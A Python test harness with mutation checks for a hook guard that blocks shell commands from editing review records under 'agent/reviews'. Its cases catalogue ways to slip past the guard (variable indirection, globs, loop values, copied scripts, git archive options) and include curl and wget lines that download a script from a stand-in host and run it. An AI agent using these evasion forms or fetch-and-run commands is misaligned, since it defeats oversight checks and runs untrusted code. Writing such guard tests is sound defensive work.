#!/usr/bin/env python3
"""Control harness for block_review_file_shell_write: the shell half of "a review record is never edited by hand".

The cases and the runner live in `test-block_review_file_edit.py` beside this file, so the two halves are judged by one set of rules; this file runs the shell cases through dispatch.py in both directions, then plants the guard's DEFECT and requires the run to fail.

The cases below are this guard's own, added to the shared shell cases: the operand arms read the words as bash expands them (#f6334e52), the glob pre-filter reads only a glob that can spell the review directory as one (#a1852a9e), a redirect target and an in-place option are read as bash expands them (#4deea064), a copied script carries its source (#3ff3bb16), and a word the walk cannot expand is read by where its value comes from (#b53f586d). Each MUTANT plants the defect one of them fixed and must turn at least one row, so neither fix is pinned by a harness that cannot see it.

    test-block_review_file_shell_write.py
"""

import importlib
import importlib.util
import json
import pathlib
import sys
import typing

SHARED = pathlib.Path(__file__).resolve().with_name("test-block_review_file_edit.py")
STEM = "block_review_file_shell_write"
# A line that writes a Python program opening a review file for writing (#3ff3bb16 rows).
_REVIEW_WRITER = "printf \"open('agent/reviews/x/y.md','w')\\n\" > /tmp/r87s.py"

OWN_CASES = [
    # #f6334e52: each refusal was allowed (rc 0) at a7b3a36f6, because the operand was read as typed (`$D/y.md`).
    ("tee through an assigned directory", "D=agent/reviews/x; tee $D/y.md", True),
    ("sudo tee through an assigned directory", "D=agent/reviews/x; sudo tee $D/y.md", True),
    ("timeout tee through an assigned directory", "D=agent/reviews/x; timeout 5 tee $D/y.md", True),
    ("tee through a quoted braced variable", 'D=agent/reviews/x; tee "${D}/y.md"', True),
    ("truncate through an assigned directory", "D=agent/reviews/x; truncate -s 0 $D/y.md", True),
    ("sed -i through an assigned directory", "D=agent/reviews/x; sed -i s/a/b/ $D/y.md", True),
    ("cp onto an assigned directory", "D=agent/reviews/x; cp /tmp/a.md $D/", True),
    ("tee through an assigned directory, elsewhere", "D=plain; tee $D/y.md", False),
    ("cat through an assigned directory", "D=agent/reviews/x; cat $D/y.md", False),
    ("tee through an unset variable", "tee $UNSET_REVIEW_DIR/y.md", False),
    # #a1852a9e: the first two were refused (rc 2) at a7b3a36f6 for the `.*` inside the sed or perl expression.
    ("sed -i with .* then the script runs", "sed -i 's/a.*b/c/' x.py && python3 x.py", False),
    (
        "perl -pi with .* then the script runs",
        "perl -pi -e 's/a.*b/c/' x.py && python3 x.py",
        False,
    ),
    ("cp onto a glob that reads as the directory", "cp x agent/revi*s/", True),
    ("sed -i with .* on a globbed review file", "sed -i 's/a.*b/c/' agent/revi*s/x/y.md", True),
    ("tee onto a glob under cd agent", "cd agent && tee revi*s/y.md", True),
    ("xargs cp fed a glob under cd agent", "cd agent && echo revi*s/x | xargs cp a", True),
    # A glob in the directory the run executes in is read as one in its word is: this was allowed (rc 0) at a7b3a36f6.
    ("tee under a globbed cd", "cd agen? && tee revi*s/x.md", True),
    ("tee under a globbed cd, a sibling directory", "cd agen? && tee reviews-old/x.md", False),
    # #4deea064: each refusal was allowed (rc 0) at d73b26844, because a redirect target and sed's options were read as typed. bash writes `agent/reviews/x/y.md` in each, and opens a group's redirect before its body runs.
    ("redirect through an assigned directory", "D=agent/reviews/x; echo hi > $D/y.md", True),
    ("append through a quoted assigned directory", 'D=agent/reviews/x; echo hi >> "$D/y.md"', True),
    (
        "redirect through an assigned directory under cd agent",
        "cd agent && D=reviews/x; echo hi > $D/y.md",
        True,
    ),
    (
        "group redirect expanded before its body",
        "D=agent/reviews; { D=plain; echo hi; } > $D/y.md",
        True,
    ),
    ("sed in place through an assigned option", "F=-i; sed $F s/a/b/ agent/reviews/x/y.md", True),
    (
        "group redirect, the value the body assigns",
        "D=plain; { D=agent/reviews/x; echo hi; } > $D/y.md",
        False,
    ),
    ("redirect bash refuses as ambiguous", 'D="agent/reviews/x y"; echo hi > $D', False),
    ("sed -n through an assigned option", "F=-n; sed $F p agent/reviews/x/y.md", False),
    # #3ff3bb16: a copy carries its source. The first was refused (rc 2) at d73b26844 as a script written from a source the hook cannot read, and the second allowed (rc 0), its directory landing never recorded; the last two stay refused.
    (
        "a copied script run in the same command",
        "cp .claude/rediacc_hooks/__init__.py /tmp/r87c.py && python3 /tmp/r87c.py --out reviews.txt",
        False,
    ),
    (
        "a script copied into a directory, then run",
        "%s && cp /tmp/r87s.py /var/tmp/ && python3 /var/tmp/r87s.py" % _REVIEW_WRITER,
        True,
    ),
    (
        "a copied script that writes a review file",
        "%s && cp /tmp/r87s.py /tmp/r87d.py && python3 /tmp/r87d.py" % _REVIEW_WRITER,
        True,
    ),
    (
        "a no-clobber copy stays unreadable",
        "cp -n .claude/rediacc_hooks/__init__.py /tmp/r87c.py && python3 /tmp/r87c.py --out reviews.txt",
        True,
    ),
    # Review 0600a464.1: a directory the same command makes is a directory (`/tmp/r92-made` is absent when the hook runs). The first two were allowed (rc 0) at 2672ed8f6: the copy was recorded as a file named `/tmp/r92-made` and `python3 /tmp/r92-made/r87s.py` read the disk, where nothing was; the third, a directory whose name the walk cannot expand, is unjudgeable and refused.
    (
        "a script copied into a directory the command makes, then run",
        "%s && mkdir -p /tmp/r92-made && cp /tmp/r87s.py /tmp/r92-made && python3 /tmp/r92-made/r87s.py"
        % _REVIEW_WRITER,
        True,
    ),
    (
        "a script copied into a directory install -d makes, then run",
        "%s && install -d /tmp/r92-made && cp /tmp/r87s.py /tmp/r92-made && python3 /tmp/r92-made/r87s.py"
        % _REVIEW_WRITER,
        True,
    ),
    (
        "a script copied where an unexpanded mkdir may make a directory",
        '%s && mkdir -p "$(echo /tmp/r92-made)" && cp /tmp/r87s.py /tmp/r92-made && python3 /tmp/r92-made/r87s.py'
        % _REVIEW_WRITER,
        True,
    ),
    # #97ed76a7: a group's redirect is on the runs inside it, joined to the `cd` in force (allowed, rc 0, at 2672ed8f6); a variable `for` or `read` assigned is not the stale value (refused, rc 2, at 2672ed8f6, while bash writes `plain/y.md`).
    ("a group redirect under a cd", "cd agent/reviews/x && { echo hi; } > y.md", True),
    ("an if redirect under a cd", "cd agent/reviews/x && if true; then echo hi; fi > y.md", True),
    ("a function body is walked", "function f { tee agent/reviews/x/y.md; }", True),
    (
        "a for loop reassigns the variable",
        "D=agent/reviews/x; for D in plain; do echo hi > $D/y.md; done",
        False,
    ),
    (
        "read reassigns the variable",
        "D=agent/reviews/x; read D <<< plain; echo hi > $D/y.md",
        False,
    ),
    # #b53f586d: a word the walk cannot expand is read by where its value comes from. Each refusal was allowed (rc 0) at 6238f04a6 while bash 5.3 writes the review file; the controls were allowed there too and stay allowed.
    (
        "a for loop walks the review directory",
        "for D in agent/reviews/x; do echo hi > $D/y.md; done",
        True,
    ),
    (
        "tee through a loop over the review directory",
        "for D in agent/reviews/x; do tee $D/y.md; done",
        True,
    ),
    (
        "a loop word that globs the directory",
        "for D in agent/revi*s/x; do echo hi > $D/y.md; done",
        True,
    ),
    (
        "a trimmed loop value",
        "for f in agent/reviews/x/a.md; do cp /tmp/a ${f%.md}.txt; done",
        True,
    ),
    ("read takes the review directory", "read D <<< agent/reviews/x; echo hi > $D/y.md", True),
    (
        "printf -v assigns the review directory",
        "printf -v D %s agent/reviews/x; echo hi > $D/y.md",
        True,
    ),
    ("set -- assigns the review directory", "set -- agent/reviews/x; echo hi > $1/y.md", True),
    ("a substitution names the review directory", 'echo hi > "$(echo agent/reviews/x)/y.md"', True),
    ("a default assigns the review directory", "echo hi > ${D:=agent/reviews/x}/y.md", True),
    ("an unknown segment under cd agent", "cd agent && echo hi > $X/y.md", True),
    ("an unknown segment after agent/", "echo hi > agent/$X", True),
    ("a for loop elsewhere", "for D in plain; do echo hi > $D/y.md; done", False),
    ("an unknown target outside agent", "echo hi > $D/y.md", False),
    ("two unknown segments", 'cat agent/reviews/x/a.md > "$OUT/$NAME"', False),
    (
        "a mktemp target on a line reading a review",
        "T=$(mktemp); cat agent/reviews/x/a.md > $T",
        False,
    ),
    (
        "a trimmed loop value lands elsewhere",
        "for f in agent/reviews/x/a.md; do cp /tmp/a /tmp/${f##*/}; done",
        False,
    ),
    ("a loop that reads review files", 'for f in agent/reviews/x/*.md; do cat "$f"; done', False),
    ("set -- elsewhere", "set -- plain; cat agent/reviews/x/a.md > $1/y.md", False),
    # #b53f586d: a downloaded script names no review word and has no source on disk; it was allowed (rc 0) at 6238f04a6.
    (
        "a downloaded script run in the same command",
        "curl -s https://example.invalid/x > /tmp/r97u.py && python3 /tmp/r97u.py",
        True,
    ),
    # #63109cf2: a script a tool writes through its own output option is written, with content this hook cannot read. The first three were allowed (rc 0) at 8ef785864, the script read as absent; the control runs a script nothing in the line writes.
    (
        "curl -o then the script runs",
        "curl -so /tmp/r98u.py https://example.invalid/x && python3 /tmp/r98u.py",
        True,
    ),
    (
        "wget -O then the script runs",
        "wget -qO /tmp/r98u.py https://example.invalid/x && python3 /tmp/r98u.py",
        True,
    ),
    (
        "an extracted script runs",
        "tar -xf /tmp/r98u.tar -C /tmp/r98ux && python3 /tmp/r98ux/a.py",
        True,
    ),
    (
        "curl -o, then another script runs",
        "curl -so /tmp/r98u.py https://example.invalid/x && python3 /tmp/r98u-absent.py",
        False,
    ),
    # 8ef78586.1: `${!P}` is the value of the variable P names, not `$!`. The first three were allowed (rc 0) at 8ef785864, read as `0/y.md`, while bash 5.3 writes `agent/reviews/x/y.md`; the controls were allowed there too and stay allowed.
    (
        "an indirect expansion through two known names",
        "P=D; D=agent/reviews/x; echo hi > ${!P}/y.md",
        True,
    ),
    ("tee through an indirect expansion", "P=D; D=agent/reviews/x; tee ${!P}/y.md", True),
    (
        "an indirect expansion through an unknown name",
        "D=agent/reviews/x; echo hi > ${!P}/y.md",
        True,
    ),
    ("an indirect expansion elsewhere", "P=D; D=plain; echo hi > ${!P}/y.md", False),
    ("an unknown indirect expansion outside agent", "echo hi > ${!P}/y.md", False),
    # 2026-10-20: `git archive <rev> -- <review path>` streams a tar to stdout and writes no file it names; it was refused (rc 2) as "git naming <path>". The tar extract into /tmp writes nothing under the directory; the last four land a file there.
    (
        "git archive of a review path, extracted into /tmp",
        "git archive HEAD -- agent/reviews/b/x.md | tar -x -C /tmp/r20x",
        False,
    ),
    (
        "git archive of a review directory, extracted into /tmp",
        "git archive HEAD~1 -- agent/reviews/b | tar -x -C /tmp/r20x",
        False,
    ),
    (
        "git archive of a plain path, extracted into /tmp",
        "git archive HEAD -- docs/a.md | tar -x -C /tmp/r20x",
        False,
    ),
    (
        "git archive extracted INTO the review directory",
        "git archive HEAD~1 -- agent/reviews/b | tar -x -C agent/reviews/b",
        True,
    ),
    ("git archive -o onto a review path", "git archive -o agent/reviews/b/x.tar HEAD", True),
    # review 58be8bbc.1: parse-options takes a unique long-option prefix and a short bundle ending in a value flag.
    (
        "git archive --outp (unique prefix) onto a review path",
        "git archive --outp agent/reviews/b/x.tar HEAD",
        True,
    ),
    (
        "git archive -vo (short bundle) onto a review path",
        "git archive -vo agent/reviews/b/x.tar HEAD",
        True,
    ),
    (
        "git archive -v (no value) then a review pathspec, into /tmp",
        "git archive -v HEAD -- agent/reviews/b/x.md | tar -x -C /tmp/r20x",
        False,
    ),
    (
        "git archive --output= onto a review path",
        "git archive HEAD --output=agent/reviews/x.tar",
        True,
    ),
    (
        "git archive piped to tar -xf - into the directory",
        "git archive HEAD | tar -xf - -C agent/reviews/b",
        True,
    ),
]

MUTANTS = [
    (
        "operands read as typed only (#f6334e52)",
        (
            "what = _operand_write(run, name, list(words), where, base, cwd)",
            "what = _operand_write(run, name, argv, where, base, cwd)",
        ),
    ),
    (
        "any glob character sends the command on (#a1852a9e)",
        ("and not _globs_reviews(cmd, cwd)", 'and not any(ch in cmd for ch in "*?[{")'),
    ),
    (
        "the pre-filter blind to a glob word",
        ("        if any(spells(w, where) for w in words):", "        if False:"),
    ),
    (
        "a run's redirects read as typed (#4deea064)",
        (
            "for target in shellscan.redirect_targets(run):\n            if _is_review(target, where, base):",
            "for target in run.writes:\n            if _is_review(target, where, base):",
        ),
    ),
    (
        "the run directory joined as typed",
        (
            "for w in joined for form in _review_forms(w)",
            (
                "for w in joined[:1] for form in [*_review_forms(w), *("
                "str(cwd).rstrip('/') + '/' + f for f in _review_forms(w) if cwd)]"
            ),
        ),
    ),
    (
        "an unexpandable redirect read as typed only (#b53f586d)",
        (
            "for form, definite in _readings(target, run, cmd):",
            "for form, definite in []:",
        ),
    ),
    (
        "loop values not read (#b53f586d)",
        (
            '    if kind == "var" and name in loop:\n        return list(loop[name]), True\n',
            "",
        ),
    ),
    (
        "a variable's spelled source not read (#b53f586d)",
        (
            "source = _value_source(name, cmd, shellscan._CLOBBERED in str(value))",
            "source = None",
        ),
    ),
    (
        "unjudgeable programs judged by the review word alone (#b53f586d)",
        (
            "and not _programs_name_reviews(cmd, cwd)",
            'and not any("reviews" in t for t in shellscan.interpreter_scripts(cmd, cwd))',
        ),
    ),
    (
        "git archive positionals read as files it writes (2026-10-20)",
        ('    if verb == "archive":', "    if False:"),
    ),
    (
        "an indirect expansion read as $! (8ef78586.1)",
        ('elif body.startswith("!") and len(body) > 1:', "elif False:"),
    ),
]


def _shared():
    spec = importlib.util.spec_from_file_location("review_file_harness", SHARED)
    if spec is None or spec.loader is None:
        raise SystemExit("cannot load %s" % SHARED)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def _planted(shared, old, new):
    """The guard with `old` replaced by `new`, run in-process; None when `old` is not in the guard outside its DEFECT declaration."""
    shared._syspath.on_sys_path(str(shared.HERE.parents[2]))
    hookio = importlib.import_module("rediacc_hooks.hookio")
    good = importlib.import_module("rediacc_hooks.guards.%s" % STEM)
    src = pathlib.Path(str(good.__file__)).read_text(encoding="utf-8")
    if old not in shared._outside_defect(src):
        return None
    ns: dict[str, typing.Any] = {"__name__": "planted_" + STEM, "__file__": good.__file__}
    exec(compile(src.replace(old, new), str(good.__file__), "exec"), ns)

    def run(_stem, payload):
        event = hookio.Event(json.dumps(payload))
        rc = ns["run"](event)
        _rc, out, err = event.result(rc)
        return rc, out + err

    return run


def main():
    shared = _shared()
    shared.SHELL_CASES = [*shared.SHELL_CASES, *OWN_CASES]
    total = shared.main((STEM,))
    own = [(n, {"tool_name": "Bash", "tool_input": {"command": c}}, r) for n, c, r in OWN_CASES]
    fails = 0
    for label, (old, new) in MUTANTS:
        runner = _planted(shared, old, new)
        if runner is None:
            fails += 1
            print("plant %-52s *** FAIL *** it no longer applies to the guard" % label)
            continue
        turned = shared.run_cases(STEM, own, runner, quiet=True)
        fails += not turned
        print(
            "plant %-52s turns %d row(s) %s"
            % (label, turned, "ok" if turned else "*** FAIL *** the harness cannot see it")
        )
    print("MUTANT FAILURES: %d" % fails)
    return 1 if total or fails else 0


if __name__ == "__main__":
    sys.exit(main())
